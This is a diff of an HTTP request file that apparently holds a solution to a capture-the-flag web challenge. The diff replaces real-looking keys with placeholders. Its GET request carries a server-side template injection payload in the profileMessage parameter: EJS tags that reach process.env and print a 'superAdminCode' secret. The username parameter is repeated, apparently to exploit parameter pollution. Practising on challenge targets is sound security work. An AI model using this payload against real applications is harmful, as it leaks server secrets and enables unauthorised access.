@@ -1,6 +1,6 @@
 ###
 
-GET https://chal38-4589uyh.vercel.app/profileName?username=robertf&username=robertf&key=784HDHASJJ3489JJFKSJ&profileMessage=<% const g = global["PROCESS".toLowerCase``]["ENV".toLowerCase``]["superAdminCode"]; %><%- name %><%- `  ${g}` %> HTTP/1.1
+GET https://chal38-4589uyh.vercel.app/profileName?username=robertf&username=robertf&key=THESUPERADMINCODEGOESHERE&profileMessage=<% const g = global["PROCESS".toLowerCase``]["ENV".toLowerCase``]["superAdminCode"]; %><%- name %><%- `  ${g}` %> HTTP/1.1
 
 ###
 
@@ -9,7 +9,7 @@ Content-Type: application/json
 
 {
   "username": "robertf",
-  "key": "!!!6g44534i8j4589gj90kg5"
+  "key": "ROBERT-F-KEY-GOES-HERE"
 }
 
 ###
